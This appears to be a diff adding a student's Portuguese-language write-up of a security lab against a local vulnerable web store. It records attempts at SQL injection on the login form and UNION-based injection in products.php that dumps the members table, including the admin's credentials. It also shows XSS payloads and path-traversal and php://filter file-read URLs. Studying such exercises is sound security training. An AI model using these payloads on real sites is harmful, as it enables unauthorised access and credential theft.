@@ -111,3 +111,114 @@ http://192.168.1.6/products.php?type=1&lang=php://filter/read=convert.base64-enc
 
 vendo o pedido que ele estava a fazer para chegar ao portfolio 
 http://192.168.1.6/download.php?item=../../../../../../../../var/www/html/config.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------------------------------------------------------------------
+Inicialmente começou-se por percorrer todas as páginas do site, tomando especial atenção ao login, onde se tentaram injeções de sql básicas, tanto no email como na password, sem chegar a nenhuma conclusão. Estas tentativas foram baseadas nas approaches de sql injection da aula prática 1, portanto: 
+
+email: ' or '1'='1' -- 
+password: abc
+
+email: ' or 1 -- 
+password: abc
+
+username: ' or '1'='1' -- // 
+email: abc
+
+E tudo falhava porque o campo do email pedia para introduzir um email válido. 
+Tentou-se então sql injection de outra maneira, pesquisando sobre como introduzir algo no email que o SQL aceitasse como email, embora não o fosse.
+src: https://stackoverflow.com/questions/2923594/valid-email-addresses-xss-and-sql-injection
+
+email: "'OR 1=1--"@gmail.com
+password: abc
+
+Novamente sem sucesso, tentou-se colocar regex no campo do email, que corresponde-se a um formato genérico de email
+
+email: [a-z0-9.-_+]@[a-z0-9.-].com
+password: abc
+
+Não chegando a qualquer resultado palpável, continuou-se a explorar o site, onde se começou a descobrir pormenores mais interessantes:  
+1.  A partir do url das páginas Board e Software, notou-se uma possibilidade de conseguir fazer sql injection, uma vez que tinha '?type=1' ou '?prod=3&type=1', por exemplo. 
+	Assim sendo, começou-se a tentar injeções, novamente com base na aula prática 1.
+	Inicialmente fizemos várias tentativas para descobrir quantas colunas eram retornadas pelos queries feitos às bases de dados. Sabíamos que havia pelo menos 5 (name, price, type, details e id). 
+	
+	<ip>/products.php?type=1 union select 1,2,3,4,5 -- 
+		Apareceu mais um produto no fim da lista, cujo nome era 3, o que nos fez suspeitar que a 3º coluna retornada pelos queries à base de dados era colocada no atributo name do produto. Assim, achámos que a melhor forma de fazer sql injection nesta página seria a partir da 3 coluna, o que é explorado abaixo. 
+		Clicando no produto não se chegou a conclusão nenhuma.
+		
+	<ip>/products.php?type=1 union select 1,2,3,4,5,6 -- 
+		Este url já nos redireciona para a home, pelo que se concluiu que eram só 5 colunas. 
+		
+	<ip>/products.php?type=1 union select 1,database(),3,4,5 -- 
+		Com isto apareceu mais um produto cujo nome era 3. Clicando nesse mesmo e observando o url, apercebemo-nos de que o type correspondia a 'oldstore'.
+		
+	<ip>/products.php?type=1 union select 1, table_name, column_name, table_schema, 5 from information_schema.columns -- 	
+		Percorrendo a página inteira, encontrou-se no fundo os nomes de algumas tabelas que se pensou serem interessantes explorar: 
+		
+		<ip>/products.php?type=1 union select 1,2,COLUMN_NAME,4,5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="tblProducts"
+			Devolve o nome de todos os produtos disponíveis, a partir da qual é possível fazer coisas do tipo:
+		
+			<ip>/products.php?type=1 union select 1,2, id,4,5 from tblProducts -- 
+				Verificar todos os ids dos produtos existentes na base de dados.
+			
+			<ip>/products.php?type=1 union select 1,2, title,4,5 from tblBlogs --
+				Verificar os títulos dos blogs existentes na base de dados.
+				
+			Mas mais interessante:
+			<ip>/products.php?type=2 union select 1, 2, id, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, username, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, password, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, session, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, name, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, blog, 4, 5 from tblMembers
+			<ip>/products.php?type=2 union select 1, 2, admin, 4, 5 from tblMembers
+				Temos então agora acesso ao mail do admin, à sua password, sessão, nome, entre outros.
+
+			Tabelas importantes:
+			tblBlogs (author, title, content)
+			tblMembers (id, username, password, session, name, blog, admin)
+			tblProducts (id, type, name, price, detail)
+			
+			conteúdo da tabela tblMembers:
+			1	admin@integratingsolutions.net	Administrator	354403ec41ad649d1e5a9f108f0e5245	Admin	1	1
+
+Podemos então entrar, agora, na conta do admin.
+email: admin@integratingsolutions.net
+password: Administrator
+
+Nota: tínhamos já obtido o email previamente através da página blogs, porque clicando em 'by Admin' era possível ver qual o email associado ao mesmo. 
+
+O próximo passo foi atacar novamente o login, tentando injeção já com o email.
+email: admin@integratingsolutions.net
+password: "' or 1 = 1 -- 
+		  (ou outra equivalente, como: "' or 1 = 1 -- )
+		  
+Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de fazer sql injection e xss:
+<script>{console.log(“ola”)}</script> 
+	Resultando numa mensagem na consola: GET http://192.168.1.7/ola
+<img src="https://shifter.sapo.pt/wp-content/uploads/2018/03/rickrolled.png">
+	Embora não se possa colocar uma imagem no titulo, o conteúdo não é filtrado no sentido em que não verifica de onde vem a informação e posta tudo o que lhe é fornecido. 
+<script>alert('eheh')</script>
+<div><p>"something"</p></div>
+<? php echo 'hello' ?>
+
+
+Continuando com a exploração da página em si, suscitaram-nos a atenção dois pormenores:
+1. Aquando na página dos termos e condições (que também contém o email do admin), seria de esperar que clicar quer em GBP, EUR ou USD no rodapé da página fizesse algo, o que não aconteu, embora o atributo lang aparecesse no url. Isto será explorado mais à frente. 
+
+2. Querendo saber o que o portfolio fazia para iniciar o download, fizemos hover sobre o mesmo e obtivemos o seguinte urll:
+	<ip>/download.php?item=Brochure.pdf
+	
